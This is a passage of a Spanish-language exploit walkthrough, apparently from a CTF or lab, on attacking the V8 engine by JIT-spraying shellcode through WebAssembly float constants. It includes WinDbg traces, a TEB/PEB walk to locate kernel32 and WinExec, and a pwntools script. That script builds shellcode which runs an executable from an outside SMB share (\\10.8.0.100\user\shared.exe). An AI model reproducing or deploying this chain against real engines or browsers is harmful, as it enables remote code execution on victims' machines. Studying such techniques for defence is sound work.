<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">0x5c411
V8 version 12.2.0 (candidate)
d8> %DebugPrint(tmp_obj);
DebugPrint: 000003CC0005C411: [JS_OBJECT_TYPE]  </span>
</code></pre></div></div><br>

<p class="plain-text">Al compilar las instrucciones en <code class="language-plaintext highlighter-rouge">WebAssembly</code> las constantes se insertan como un código, iniciamos convirtiendo los qwords a constantes flotantes <code class="language-plaintext highlighter-rouge">f64.const</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">let</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> [
    </span><span class="mi">0x4141414141414141n</span><span class="p">,
    </span><span class="mi">0x4242424242424242n</span><span class="p">,
]

</span><span class="o">for</span><span class="p"> (</span><span class="no">let</span><span class="p"> i</span><span class="o"> =</span><span class="mi"> 0</span><span class="p">; i</span><span class="o"> &lt</span><span class="p"> shellcode.length; i</span><span class="o">++</span><span class="p">)
    </span><span class="na">console</span><span class="p">.</span><span class="no">log</span><span class="p">(</span><span class="s">'f64.const '</span><span class="o"> +</span><span class="p"> itof(shellcode[i]));</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\user\Desktop\v8_release> </span><span class="am">.\d8.exe</span><span class="p"> .\file.js  
f64.const 2261634.5098039214
f64.const 156842099844.51764
PS C:\Users\user\Desktop\v8_release></span>
</code></pre></div></div><br>

<p class="plain-text">Ahora necesitamos convertir de formato de texto a <code class="language-plaintext highlighter-rouge">WebAssembly</code> usando <code class="language-plaintext highlighter-rouge">wat2wasm</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">(</span><span class="no">module</span><span class="p">
    (func (</span><span class="o">export</span><span class="s"> "main"</span><span class="p">)
        f64.const</span><span class="mi"> 2261634.5098039214</span><span class="p">
        f64.const </span><span class="mi">156842099844.51764</span><span class="p">

        </span><span class="o">return</span><span class="p">
    )
)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ wat2wasm</span><span class="p"> -v file.wat -o file.wasm
0000000: 0061 736d                                 ; WASM_BINARY_MAGIC
0000004: 0100 0000                                 ; WASM_BINARY_VERSION
; section "Type" (1)
0000008: 01                                        ; section code
0000009: 00                                        ; section size (guess)
000000a: 01                                        ; num types
; func type 0
000000b: 60                                        ; func
000000c: 00                                        ; num params
000000d: 00                                        ; num results
0000009: 04                                        ; FIXUP section size
; section "Function" (3)
000000e: 03                                        ; section code
000000f: 00                                        ; section size (guess)
0000010: 01                                        ; num functions
0000011: 00                                        ; function 0 signature index  
000000f: 02                                        ; FIXUP section size
; section "Export" (7)
0000012: 07                                        ; section code
0000013: 00                                        ; section size (guess)
0000014: 01                                        ; num exports
0000015: 04                                        ; string length
0000016: 6d61 696e                                main  ; export name
000001a: 00                                        ; export kind
000001b: 00                                        ; export func index
0000013: 08                                        ; FIXUP section size
; section "Code" (10)
000001c: 0a                                        ; section code
000001d: 00                                        ; section size (guess)
000001e: 01                                        ; num functions
; function body 0
000001f: 00                                        ; func body size (guess)
0000020: 00                                        ; local decl count
0000021: 44                                        ; f64.const
0000022: 4141 4141 4141 4141                       ; f64 literal
000002a: 44                                        ; f64.const
000002b: 4242 4242 4242 4242                       ; f64 literal
0000033: 0f                                        ; return
0000034: 0b                                        ; end
000001f: 15                                        ; FIXUP func body size
000001d: 17                                        ; FIXUP section size</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos pasar el archivo <code class="language-plaintext highlighter-rouge">wasm</code> a un array de enteros usando el siguiente script, una vez lo agregamos al exploit y creamos un <code class="language-plaintext highlighter-rouge">main</code> a partir de la instancia</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">with</span><span class="no"> open</span><span class="p">(</span><span class="s">"file.wasm"</span><span class="p">,</span><span class="s"> "rb"</span><span class="p">)</span><span class="o"> as</span><span class="p"> file:
    wasmCode </span><span class="o">=</span><span class="p"> file.read()

wasmCode_arr </span><span class="o">= </span><span class="p">[]

</span><span class="o">for</span><span class="p"> c</span><span class="o"> in</span><span class="p"> wasmCode:
    wasmCode_arr.append(c)

</span><span class="no">print</span><span class="p">(</span><span class="na">str</span><span class="p">(wasmCode_arr))</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">read_wasm.py
[0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 23, 1, 21, 0, 68, 65, 65, 65, 65, 65, 65, 65, 65, 68, 66, 66, 66, 66, 66, 66, 66, 66, 15, 11]  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">let</span><span class="p"> wasmCode</span><span class="o"> = new</span><span class="na"> Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi"> 97</span><span class="p">,</span><span class="mi"> 115</span><span class="p">,</span><span class="mi"> 109</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 4</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 96</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 3</span><span class="p">,</span><span class="mi"> 2</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 7</span><span class="p">,</span><span class="mi"> 8</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 4</span><span class="p">,</span><span class="mi"> 109</span><span class="p">,</span><span class="mi"> 97</span><span class="p">,</span><span class="mi"> 105</span><span class="p">,</span><span class="mi"> 110</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 10</span><span class="p">,</span><span class="mi"> 23</span><span class="p">,</span><span class="mi"> 1</span><span class="p">,</span><span class="mi"> 21</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 65</span><span class="p">,</span><span class="mi"> 65</span><span class="p">,</span><span class="mi"> 65</span><span class="p">,</span><span class="mi"> 65</span><span class="p">,</span><span class="mi"> 65</span><span class="p">,</span><span class="mi"> 65</span><span class="p">,</span><span class="mi"> 65</span><span class="p">,</span><span class="mi"> 65</span><span class="p">,</span><span class="mi"> 68</span><span class="p">,</span><span class="mi"> 66</span><span class="p">,</span><span class="mi"> 66</span><span class="p">,</span><span class="mi"> 66</span><span class="p">,</span><span class="mi"> 66</span><span class="p">,</span><span class="mi"> 66</span><span class="p">,</span><span class="mi"> 66</span><span class="p">,</span><span class="mi"> 66</span><span class="p">,</span><span class="mi"> 66</span><span class="p">,</span><span class="mi"> 15</span><span class="p">,</span><span class="mi"> 11</span><span class="p">]);  
</span><span class="no">let</span><span class="p"> wasmModule</span><span class="o"> = new</span><span class="p"> WebAssembly.Module(wasmCode);
</span><span class="no">let</span><span class="p"> wasmInstance </span><span class="o">= new</span><span class="p"> WebAssembly.Instance(wasmModule);
</span><span class="no">let </span><span class="p">main</span><span class="o"> =</span><span class="p"> wasmInstance.exports.main;</span>
</code></pre></div></div><br>

<p class="plain-text">La dirección de la <code class="language-plaintext highlighter-rouge">jump_table_start</code> se encuentra a un offset de <code class="language-plaintext highlighter-rouge">0x47</code> a partir de la <code class="language-plaintext highlighter-rouge">wasmInstance</code>, agregaremos un breakpoint de hardware para ver donde se accede</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">V8 version 12.2.0 (candidate)
d8> %DebugPrint(wasmInstance);
DebugPrint: 000002240019A979: [WasmInstanceObject] in OldSpace
 - map: 0x022400191161 &ltMap[208](HOLEY_ELEMENTS)> [FastProperties]  
 - prototype: 0x02240019120d &ltObject map = 000002240019ABC1>
 - elements: 0x0224000006cd &ltFixedArray[0]> [HOLEY_ELEMENTS]
 .................................................................  
 - isorecursive_canonical_types: 0000021B4B855420
 - jump_table_start: 0000006328D01000</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dq 0x2240019A979 - 1
00000224`0019a978  000006cd`00191161 000006cd`000006cd  
00000224`0019a988  00000e69`000006cd 00000e69`00006175  
00000224`0019a998  00000000`00000e69 ffffffff`ff000000  
00000224`0019a9a8  00000000`00000000 0000021b`4b855420  
00000224`0019a9b8  ffffffff`ff000000 00000063`28d01000  
00000224`0019a9c8  0000021b`48e51b90 0000021b`48e51b88  
00000224`0019a9d8  0000021b`48e51ba8 0000021b`48e51ba0  
00000224`0019a9e8  0000021b`4b7f92f9 0000021b`4b839860  

</span><span class="ro">0:000></span><span class="p"> dq 0x2240019A979 - 1 + 0x48 L1
00000224`0019a9c0  00000063`28d01000

</span><span class="ro">0:000></span><span class="p"> ba r1 0x2240019a9c0</span>
</code></pre></div></div><br>

<p class="plain-text">Llamamos al <code class="language-plaintext highlighter-rouge">main</code> y llegamos a una función donde se termina saltando a <code class="language-plaintext highlighter-rouge">r15</code> que dentro ejecuta otro <code class="language-plaintext highlighter-rouge">jmp</code> a una función creada con los datos de la <code class="language-plaintext highlighter-rouge">wasmInstance</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">d8> main();  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g
Breakpoint 1 hit
d8!CrashForExceptionInNonABICompliantCodeRange+0x8be392:
00007ff6`48e4fd92 488be5          mov     rsp,rbp

</span><span class="ro">0:000></span><span class="p"> u rip L3
d8!CrashForExceptionInNonABICompliantCodeRange+0x8be392:
00007ff6`48e4fd92 488be5          mov     rsp,rbp
00007ff6`48e4fd95 5d              pop     rbp
00007ff6`48e4fd96 41ffe7          jmp     r15

</span><span class="ro">0:000></span><span class="p"> p
d8!CrashForExceptionInNonABICompliantCodeRange+0x8be395:
00007ff6`48e4fd95 5d              pop     rbp

</span><span class="ro">0:000></span><span class="p"> p
d8!CrashForExceptionInNonABICompliantCodeRange+0x8be396:
00007ff6`48e4fd96 41ffe7          jmp     r15 {00000063`28d01000}  

</span><span class="ro">0:000></span><span class="p"> p
00000063`28d01000 e9fb070000      jmp     00000063`28d01800

</span><span class="ro">0:000></span><span class="p"> p
00000063`28d01800 55              push    rbp</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos ver que las constantes del texto se agregan directamente en el código, podemos usar esto para insertar un shellcode y sobrescribir la dirección con la del <code class="language-plaintext highlighter-rouge">shellcode</code>, al hacerlo saltará a esa ubicación, algo a tener en cuenta es que solo podemos ingresar <code class="language-plaintext highlighter-rouge">8</code> bytes por lo que deberemos ejecutar un shellcode, pero necesitamos encadenar varios <code class="language-plaintext highlighter-rouge">jmp</code> que se encuentran a <code class="language-plaintext highlighter-rouge">9</code> bytes de distancia</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> u rip L11
00000063`28d01800 55                   push    rbp
00000063`28d01801 4889e5               mov     rbp,rsp
00000063`28d01804 6a08                 push    8
00000063`28d01806 56                   push    rsi
00000063`28d01807 4881ec10000000       sub     rsp,10h
00000063`28d0180e 493b65a0             cmp     rsp,qword ptr [r13-60h]  
00000063`28d01812 0f8631000000         jbe     00000063`28d01849
00000063`28d01818 49ba4141414141414141 mov     r10,4141414141414141h
00000063`28d01822 c4c1f96ec2           vmovq   xmm0,r10
00000063`28d01827 49ba4242424242424242 mov     r10,4242424242424242h
00000063`28d01831 c4c1f96eca           vmovq   xmm1,r10
00000063`28d01836 4c8b5677             mov     r10,qword ptr [rsi+77h]  
00000063`28d0183a 41832a36             sub     dword ptr [r10],36h
00000063`28d0183e 0f8810000000         js      00000063`28d01854
00000063`28d01844 488be5               mov     rsp,rbp
00000063`28d01847 5d                   pop     rbp
00000063`28d01848 c3                   ret</span>
</code></pre></div></div><br>

<p class="plain-text">La distancia entre el final del primer qword y el segundo es de <code class="language-plaintext highlighter-rouge">7</code> bytes pero <code class="language-plaintext highlighter-rouge">2</code> de ellos los usaremos para el <code class="language-plaintext highlighter-rouge">jmp</code> que ejecutará la siguiente parte del shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dq 0x6328d0181a L1
00000063`28d0181a  41414141`41414141  

</span><span class="ro">0:000></span><span class="p"> dq 0x6328d01829 L1
00000063`28d01829  42424242`42424242  </span>
</code></pre></div></div><br>

<p class="plain-text">Si enviamos <code class="language-plaintext highlighter-rouge">2</code> qwords iguales como parte de una optimización no escribirá de nuevo el segundo qword sino que usará una referencia al primero para ahorrar bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> u rip L11
00000044`d9981800 55                   push    rbp
00000044`d9981801 4889e5               mov     rbp,rsp
00000044`d9981804 6a08                 push    8
00000044`d9981806 56                   push    rsi
00000044`d9981807 4881ec10000000       sub     rsp,10h
00000044`d998180e 493b65a0             cmp     rsp,qword ptr [r13-60h]
00000044`d9981812 0f862e000000         jbe     00000044`d9981846
00000044`d9981818 49ba4141414141414141 mov     r10,4141414141414141h
00000044`d9981822 c4c1f96ec2           vmovq   xmm0,r10
00000044`d9981827 4c8b15ecffffff       mov     r10,qword ptr [00000044`d998181a]  
00000044`d998182e c4c1f96eca           vmovq   xmm1,r10
00000044`d9981833 4c8b5677             mov     r10,qword ptr [rsi+77h]
00000044`d9981837 41832a33             sub     dword ptr [r10],33h
00000044`d998183b 0f8810000000         js      00000044`d9981851
00000044`d9981841 488be5               mov     rsp,rbp
00000044`d9981844 5d                   pop     rbp
00000044`d9981845 c3                   ret

</span><span class="ro">0:000></span><span class="p"> dqs 0x44d998181a L1
00000044`d998181a  41414141`41414141</span>
</code></pre></div></div><br>

<p class="plain-text">Para evitarlo cuando necesitemos enviar instrucciones iguales agregaremos una instrucción <code class="language-plaintext highlighter-rouge">nop</code> cada vez para desplazar los bytes haciendolos diferentes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">shellcode </span><span class="o">=</span><span class="p"> [
    asm(</span><span class="s">"push rax;"</span><span class="p">),
    asm(</span><span class="s">"nop; push rax;"</span><span class="p">),
    asm(</span><span class="s">"nop; nop; push rax;"</span><span class="p">)
]</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciamos la parte del shellcoding, lo primero será obtener la dirección base de <code class="language-plaintext highlighter-rouge">kernel32</code>, lo haremos mediante el método <code class="language-plaintext highlighter-rouge">TEB</code>, en x64 el registro <code class="language-plaintext highlighter-rouge">gs</code> contiene un puntero a él, y en el offset <code class="language-plaintext highlighter-rouge">0x60</code> encontramos un puntero a la estructura <code class="language-plaintext highlighter-rouge">PEB</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dt ntdll!_TEB @$teb
   +0x000 NtTib            : _NT_TIB
   +0x038 EnvironmentPointer : (null) 
   +0x040 ClientId         : _CLIENT_ID
   +0x050 ActiveRpcHandle  : (null) 
   +0x058 ThreadLocalStoragePointer : 0x00000203`5daa8080 Void  
   +0x060 ProcessEnvironmentBlock : 0x0000002d`6c75a000 _PEB</span>
</code></pre></div></div><br>

<p class="plain-text">Dentro del <code class="language-plaintext highlighter-rouge">PEB</code> hay un puntero a la estructura <code class="language-plaintext highlighter-rouge">_PEB_LDR_DATA</code> con un offset de <code class="language-plaintext highlighter-rouge">0x18</code> que hace referencia a <code class="language-plaintext highlighter-rouge">3</code> listas doble enlazadas que muestren los modulos cargados</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dt ntdll!_PEB 0x2d6c75a000
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0x1 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Padding0         : [4]  ""
   +0x008 Mutant           : 0xffffffff`ffffffff Void
   +0x010 ImageBaseAddress : 0x00007ff6`88ed0000 Void
   +0x018 Ldr              : 0x00007ffd`d1e76440 _PEB_LDR_DATA  </span>
</code></pre></div></div><br>

<p class="plain-text">WinDbg describe el campo <code class="language-plaintext highlighter-rouge">InMemoryOrderModuleList</code> como una lista doblemente enlazada, que apunta a los módulos cargados, este campo accede a los módulos en orden de colocación en memoria, la entrada <code class="language-plaintext highlighter-rouge">Flink</code> accede al siguiente módulo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dt ntdll!_PEB_LDR_DATA 0x7ffdd1e76440
   +0x000 Length           : 0x58
   +0x004 Initialized      : 0x1 ''
   +0x008 SsHandle         : (null) 
   +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x00000203`5daa2b00 - 0x00000203`5daaf6a0 ]
   +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x00000203`5daa2b10 - 0x00000203`5daaf6b0 ]
   +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x00000203`5daa2980 - 0x00000203`5daa7820 ]
   +0x040 EntryInProgress  : (null) 
   +0x048 ShutdownInProgress : 0 ''
   +0x050 ShutdownThreadId : (null)

</span><span class="ro">0:000></span><span class="p"> dt ntdll!_LIST_ENTRY (0x7ffdd1e76440 + 0x20)
 [ 0x00000203`5daa2b10 - 0x00000203`5daaf6b0 ]
   +0x000 Flink            : 0x00000203`5daa2b10 _LIST_ENTRY [ 0x00000203`5daa2970 - 0x00007ffd`d1e76460 ]  
   +0x008 Blink            : 0x00000203`5daaf6b0 _LIST_ENTRY [ 0x00007ffd`d1e76460 - 0x00000203`5daaf570 ]  </span>
</code></pre></div></div><br>

<p class="plain-text">Al mostrar la estructura restando <code class="language-plaintext highlighter-rouge">0x8</code> de la direccion de la estructura <code class="language-plaintext highlighter-rouge">_LIST_ENTRY</code> para llegar al principio de la estructura <code class="language-plaintext highlighter-rouge">_LDR_DATA_TABLE_ENTRY</code>, muestra que la estructura contiene un campo llamado <code class="language-plaintext highlighter-rouge">DllBase</code> con la base del módulo, siguiendo el orden el siguiente campo cargado en memoria deberia ser el <code class="language-plaintext highlighter-rouge">ntdll.dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dt ntdll!_LDR_DATA_TABLE_ENTRY poi(0x7ffdd1e76440 + 0x20 - 0x10) 
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000203`5daa2960 - 0x00007ffd`d1e76450 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000203`5daa2970 - 0x00007ffd`d1e76460 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]  
   +0x030 DllBase          : 0x00007ff6`88ed0000 Void
   +0x038 EntryPoint       : 0x00007ff6`88ed19a0 Void
   +0x040 SizeOfImage      : 0x5a000
   +0x048 FullDllName      : _UNICODE_STRING "C:\Windows\System32\notepad.exe"
   +0x058 BaseDllName      : _UNICODE_STRING "notepad.exe"

</span><span class="ro">0:000></span><span class="p"> dt ntdll!_LDR_DATA_TABLE_ENTRY poi(poi(0x7ffdd1e76440 + 0x20 ) - 0x10) 
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000203`5daa7800 - 0x00000203`5daa2b00 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000203`5daa7810 - 0x00000203`5daa2b10 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000203`5daa7e10 - 0x00007ffd`d1e76470 ]  
   +0x030 DllBase          : 0x00007ffd`d1cf0000 Void
   +0x038 EntryPoint       : (null) 
   +0x040 SizeOfImage      : 0x217000
   +0x048 FullDllName      : _UNICODE_STRING "C:\Windows\SYSTEM32\ntdll.dll"
   +0x058 BaseDllName      : _UNICODE_STRING "ntdll.dll"</span>
</code></pre></div></div><br>

<p class="plain-text">El tercer campo en la lista doblemente enlazada es <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, y ya que en el recurso <code class="language-plaintext highlighter-rouge">smb</code> se nos otorga el de la máquina podemos calcular su offset a <code class="language-plaintext highlighter-rouge">WinExec</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dt ntdll!_LDR_DATA_TABLE_ENTRY poi(poi(poi(0x7ffdd1e76440 + 0x20 )) - 0x10)  
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000203`5daa7df0 - 0x00000203`5daa2960 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000203`5daa7e00 - 0x00000203`5daa2970 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00007ffd`d1e76470 - 0x00000203`5daa7e10 ]  
   +0x030 DllBase          : 0x00007ffd`d1850000 Void
   +0x038 EntryPoint       : 0x00007ffd`d18625e0 Void
   +0x040 SizeOfImage      : 0xc4000
   +0x048 FullDllName      : _UNICODE_STRING "C:\Windows\System32\KERNEL32.DLL"
   +0x058 BaseDllName      : _UNICODE_STRING "KERNEL32.DLL"

</span><span class="ro">0:000></span><span class="p"> ? kernel32!WinExec - kernel32
Evaluate expression: 4736 = 00000000`00001280</span>
</code></pre></div></div><br>

<p class="plain-text">Crearemos un script en python, la primera parte guarda en <code class="language-plaintext highlighter-rouge">rbx</code> la dirección de la función <code class="language-plaintext highlighter-rouge">WinExec</code>, luego empujamos al stack poco a poco la string de un archivo <code class="language-plaintext highlighter-rouge">exe</code> cargado desde un recurso <code class="language-plaintext highlighter-rouge">smb</code>, al final luego de mover la string completa a <code class="language-plaintext highlighter-rouge">rcx</code> y el valor de <code class="language-plaintext highlighter-rouge">SW_SHOW</code> a <code class="language-plaintext highlighter-rouge">rdx</code> llamamos a la función, cada uno de los valores del array debe ser menor a <code class="language-plaintext highlighter-rouge">6</code> para dejar espacio al <code class="language-plaintext highlighter-rouge">jmp</code> que saltará a los siguientes 6 bytes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> asm, context

shared</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.8.0.100</span><span class="mi">\\</span><span class="s">user</span><span class="mi">\\</span><span class="s">shared.exe"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex()

context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">

shellcode</span><span class="o"> =</span><span class="p"> [
    asm(</span><span class="s">"xor rcx, rcx"</span><span class="p">),</span><span class="c1">                    # $rcx = TEB structure</span><span class="p">
    asm(</span><span class="s">"mov rsi, gs:[rcx + 0x60]"</span><span class="p">),</span><span class="c1">        # $rsi = PEB structure</span><span class="p">
    asm(</span><span class="s">"mov rsi, [rsi + 0x18]"</span><span class="p">),</span><span class="c1">           # $rsi = PEB Loader</span><span class="p">
    asm(</span><span class="s">"mov rsi, [rsi + 0x20]"</span><span class="p">),</span><span class="c1">           # $rsi = InMemoryOrderModuleList</span><span class="p">
    asm(</span><span class="s">"mov rsi, [rsi]; lodsq"</span><span class="p">),</span><span class="c1">           # $rsi = kernel32.dll</span><span class="p">
    asm(</span><span class="s">"mov rbx, [rax + 0x20]"</span><span class="p">),</span><span class="c1">           # $rbx = kernel32 base</span><span class="p">
    asm(</span><span class="s">"mov ecx, 0x1280"</span><span class="p">),</span><span class="c1">                 # $rcx = offset to WinExec()</span><span class="p">
    asm(</span><span class="s">"add rbx, rcx"</span><span class="p">),</span><span class="c1">                    # $rbx = WinExec()</span><span class="p">
    asm(</span><span class="s">"push 0x"</span><span class="o"> +</span><span class="p"> shared[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]),</span><span class="c1">           # $rsp = &".exe"</span><span class="p">
    asm(</span><span class="s">"xor rax, rax"</span><span class="p">),</span><span class="c1">                    # $rax = 0x0</span><span class="p">
    asm(</span><span class="s">"mov eax, 0x"</span><span class="o"> +</span><span class="p"> shared[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">]),</span><span class="c1">      # $rax = "ared"</span><span class="p">
    asm(</span><span class="s">"shl rax, 0x20"</span><span class="p">),</span><span class="c1">                   # $rax = "????ared"</span><span class="p">
    asm(</span><span class="s">"or rax, 0x"</span><span class="o"> +</span><span class="p"> shared[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">]),</span><span class="c1">      # $rax = "r\shared"</span><span class="p">
    asm(</span><span class="s">"push rax"</span><span class="p">),</span><span class="c1">                        # $rsp = &"r\shared.exe"</span><span class="p">
    asm(</span><span class="s">"mov eax, 0x"</span><span class="o"> +</span><span class="p"> shared[</span><span class="mi">24</span><span class="p">:</span><span class="mi">32</span><span class="p">]),</span><span class="c1">     # $rax = "\use"</span><span class="p">
    asm(</span><span class="s">"nop; shl rax, 0x20"</span><span class="p">),</span><span class="c1">              # $rax = "????\use"</span><span class="p">
    asm(</span><span class="s">"or rax, 0x"</span><span class="o"> +</span><span class="p"> shared[</span><span class="mi">32</span><span class="p">:</span><span class="mi">40</span><span class="p">]),</span><span class="c1">      # $rax = ".100\use"</span><span class="p">
    asm(</span><span class="s">"nop; push rax"</span><span class="p">),</span><span class="c1">                   # $rsp = &".100\user\shared.exe"</span><span class="p">
    asm(</span><span class="s">"mov eax, 0x"</span><span class="o"> +</span><span class="p"> shared[</span><span class="mi">40</span><span class="p">:</span><span class="mi">48</span><span class="p">]),</span><span class="c">     # $rax = ".8.0"</span><span class="p">
    asm(</span><span class="s">"nop; nop; shl rax, 0x20"</span><span class="p">),</span><span class="c1">         # $rax = "????.8.0"</span><span class="p">
    asm(</span><span class="s">"or rax, 0x"</span><span class="o"> +</span><span class="p"> shared[</span><span class="mi">48</span><span class="p">:</span><span class="mi">56</span><span class="p">]),</span><span class="c1">      # $rax = "\\10.8.0"</span><span class="p">
    asm(</span><span class="s">"nop; nop; push rax"</span><span class="p">),</span><span class="c1">              # $rsp = &"\\10.8.0.100\user\shared.exe"  </span><span class="p">
    asm(</span><span class="s">"mov rcx, rsp; push 0x5; pop rdx"</span><span class="p">),</span><span class="c1"> # $rcx = string; $rdx = SW_SHOW</span><span class="p">
    asm(</span><span class="s">"sub rsp, 0x30; call rbx"</span><span class="p">)</span><span class="c1">          # call WinExec(string, SW_SHOW)</span><span class="p">
]</span>
</code></pre></div></div><br>

<p class="plain-text">Por cada uno de los valores rellenamos a <code class="language-plaintext highlighter-rouge">6</code> bytes usando nops y terminamos agregando el salto de <code class="language-plaintext highlighter-rouge">9</code> bytes saltando a la siguiente parte del shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)):
    shellcode[i]</span><span class="o"> =</span><span class="p"> shellcode[i].ljust(</span><span class="mi">6</span><span class="p">, asm(</span><span class="s">"nop"</span><span class="p">))  
    </span><span class="o">if</span><span class="p"> i</span><span class="o"> !=</span><span class="no"> len</span><span class="p">(shellcode) </span><span class="o">- </span><span class="mi">1</span><span class="p">:
        shellcode[i]</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $+0x9"</span><span class="p">)
    shellcode[i]</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shellcode[i][::</span><span class="o">-</span><span class="mi">1</span><span class="p">].hex(), </span><span class="mi">16</span><span class="p">)
    </span><span class="no">print</span><span class="p">(</span><span class="no">hex</span><span class="p">(shellcode[i]) </span><span class="o">+ </span><span class="s">"n,"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit muestra la lista de qwords, en este punto repetimos todo el proceso para convertirlo a formato <code class="language-plaintext highlighter-rouge">wasm</code> y convertirlo a un arreglo de enteros</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3</span><span class="p"> shellcode.py  
0x7eb909090c93148n,
0x7eb9060718b4865n,
0x7eb909018768b48n,
0x7eb909020768b48n,
0x7eb90ad48368b48n,
0x7eb909020588b48n,
0x7eb9000001280b9n,
0x7eb909090cb0148n,
0x7eb906578652e68n,
0x7eb909090c03148n,
0x7eb9064657261b8n,
0x7eb909020e0c148n,
0x7eb68735c720d48n,
0x7eb909090909050n,
